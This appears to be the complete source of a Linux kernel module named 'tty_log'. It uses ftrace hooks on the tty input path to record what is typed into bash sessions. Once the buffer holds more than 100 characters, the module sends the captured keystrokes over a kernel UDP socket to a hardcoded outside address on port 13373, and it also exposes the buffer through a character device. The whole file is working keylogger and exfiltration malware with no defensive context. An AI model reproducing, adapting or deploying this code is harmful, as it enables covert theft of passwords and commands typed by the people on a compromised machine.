#include <asm/segment.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/semaphore.h>
#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/sysfs.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/linkage.h>
#include <linux/tty.h>
#include <linux/errno.h>
#include <linux/netdevice.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <linux/socket.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("hyp");

#define DEVICE_NAME "tty_log"
#define SUCCESS 0
#define BUF_SIZE 10000
#define IP_ADD ((uint32_t)0x08080808)

#define HOOK(_name, _function, _original) \
	{									  \
		.name = (_name),				  \
		.function = (_function),		  \
		.original = (_original),		  \
	}									  

struct ksock_t {
	struct socket *sock;
	struct sockaddr_in addr;
	int running;
};

static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char __user *, size_t, loff_t *);

static int ksock_open(struct ksock_t *);
static int ksock_send(struct socket *, struct sockaddr_in *, 
		unsigned char *, int);

int is_open, last_count, count, kb_offset = 0;

static int major;

static char *tty_keybuf;
static char *msg_ptr;

static struct file_operations fops = {
	.owner = THIS_MODULE,
	.read = device_read,
	.write = device_write,
	.open = device_open,
	.release = device_release
};

struct ftrace_hook {
	const char *name;
	void *function;
	void *original;

	unsigned long address;
	struct ftrace_ops ops;
};

static int ftrace_resolve(struct ftrace_hook *hook) {
	hook->address = kallsyms_lookup_name(hook->name);

	if(!hook->address) {
		pr_debug("unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}
	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;

	return 0;
}

static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
		struct ftrace_ops *ops, struct pt_regs *regs) {

	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

	if(!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long)hook->function;
}

int install_hook(struct ftrace_hook *hook) {
	int err;

	err = ftrace_resolve(hook);
	if(err)
		return err;

	hook->ops.func = ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
		| FTRACE_OPS_FL_RECURSION_SAFE
		| FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if(err) {
		pr_debug("register_ftrace_function() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if(err) {
		pr_debug("register_ftrace_function() failed: %d\n", err);
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}

	return 0;
}

void remove_hook(struct ftrace_hook *hook) {
	int err;

	err = unregister_ftrace_function(&hook->ops);
	if(err)
		pr_debug("unregister_ftrace_function failed: %d\n", err);

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if(err)
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
}

int install_hooks(struct ftrace_hook *hooks, size_t count) {
	int err;
	size_t i;

	for(i=0;i<count;i++) {
		err = install_hook(&hooks[i]);
		if(err)
			goto error;
	}

	return 0;

error:
	while(i != 0) {
		remove_hook(&hooks[--i]);
	}

	return err;
}

void remove_hooks(struct ftrace_hook *hooks, size_t count) {
	size_t i;

	for(i=0;i<count;i++)
		remove_hook(&hooks[i]);
}

static asmlinkage int (*tty_fixed_flag)(struct tty_port *port,
		const unsigned char *chars, char flag, size_t size);

static asmlinkage int ftrace_fixed_flag(struct tty_port *port,
		const unsigned char *chars, char flag, size_t size) {
	
	int ret, cpid, sent_size;

	struct ksock_t *ksock = kmalloc(sizeof(struct ksock_t *), GFP_KERNEL);

	cpid = (int)task_tgid_nr(current);
	if(!strncmp(current->comm, "bash", strlen("bash"))) {		
		if((strlen(tty_keybuf) + size) > 100) {
	
			ksock->running = 1;

			ksock_open(ksock);
			
			if((sent_size = ksock_send(ksock->sock, &ksock->addr, tty_keybuf, 
					(int)strlen(tty_keybuf))) < 0) {
				
				pr_info("error: %d\n", sent_size);
			}
			
			sock_release(ksock->sock);
			ksock->sock = NULL;
			
			pr_info("sent: %d\n", sent_size);
			tty_keybuf[0] = '\0';

			ksock->running = 0;
		}
		
		//pr_info("comm: %s pid: %d kb_size: %d size: %d\n", current->comm, 
		//		cpid, (int)strlen(tty_keybuf), (int)size);

		strncat(tty_keybuf, chars, size);
	}
	
	//pr_info("current->comm: %s\n", current->comm);
	ret = tty_fixed_flag(port, chars, flag, size);
	
	return ret;
}

static asmlinkage long (*real_open)(const char __user *filename, 
		int flags, umode_t mode);

static asmlinkage long ftrace_open(const char __user *filename, 
		int flags, umode_t mode) {

	long ret;

	ret = real_open(filename, flags, mode);
	if(strstr(filename, "/dev/pts") !=NULL) {
		pr_info("fd path: %s pts: %ld\n", filename, ret);
	}
	
	return ret;
}

static struct ftrace_hook tty_hooks[] = {
	HOOK("sys_open", ftrace_open, &real_open),
	HOOK("tty_insert_flip_string_fixed_flag", ftrace_fixed_flag, &tty_fixed_flag)
};

static void kill_ftrace(unsigned long data) {
	remove_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
	return;
}

static int ksock_open(struct ksock_t *ksock) {
	int err;
	

	if((err = sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, 
					&ksock->sock)) < 0) {
		pr_info("could not create socket error = %d\n", err);
		return err;
	}

	memset(&ksock->addr, 0, sizeof(struct sockaddr));
	ksock->addr.sin_family = AF_INET;
	ksock->addr.sin_addr.s_addr = htonl(IP_ADD);
	ksock->addr.sin_port = htons(13373);

	if((err = ksock->sock->ops->connect(ksock->sock, 
					(struct sockaddr *)&ksock->addr, 
					sizeof(struct sockaddr), 0)) < 0) {

			pr_info("could not connect, error %d\n", err);
	}

	pr_info("connected");

	return 0;
}

static int ksock_send(struct socket *sock, struct sockaddr_in *addr,
		unsigned char *buf, int len) {

	int size;

	struct msghdr msg;
	struct iovec iov;
	
	if(sock->sk == NULL)
		return 0;

	iov.iov_base = buf;
	iov.iov_len = len;

	iov_iter_init(&msg.msg_iter, READ, &iov, 1, 1);

	msg.msg_flags = 0;
	msg.msg_name = addr;
	msg.msg_namelen = sizeof(struct sockaddr_in);
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_control = NULL;

	size = sock_sendmsg(sock, &msg);

	return size;
}

static int device_open(struct inode *inode, struct file *file) {
	if(is_open)
		return -EBUSY;

	msg_ptr = tty_keybuf;
	is_open++;
	try_module_get(THIS_MODULE);

	return SUCCESS;
}

static int device_release(struct inode *inode, struct file *file) {
	is_open--;
	module_put(THIS_MODULE);

	return 0;
}

static ssize_t device_write(struct file *filp, const char __user *buff,
		size_t len, loff_t *off) {

	return -EINVAL;
}

static ssize_t device_read(struct file *filp, char __user *buff, size_t len,
		loff_t *off) {

	int bytes_read = 0;

	if(*msg_ptr == 0)
		return 0;

	while(len && *msg_ptr) {
		put_user(*(msg_ptr++), buff++);

		len--;
		bytes_read++;
	}

	return bytes_read;
}

static int __init init_ttylog(void) {
	int err;
	
	tty_keybuf = kmalloc(BUF_SIZE, GFP_KERNEL);
	tty_keybuf[0] = '\0';
	
	major = register_chrdev(0, DEVICE_NAME, &fops);
	pr_info("ttylog major: %d\n", major);

	err = install_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
	if(err)
		return err;
	
	pr_info("hook installed\n");
	
	return 0;
}

static void __exit cleanup_ttylog(void) {
	kfree(tty_keybuf);

	remove_hooks(tty_hooks, ARRAY_SIZE(tty_hooks));
	pr_info("Unregistered ttylog\n");
}

module_init(init_ttylog);
module_exit(cleanup_ttylog);
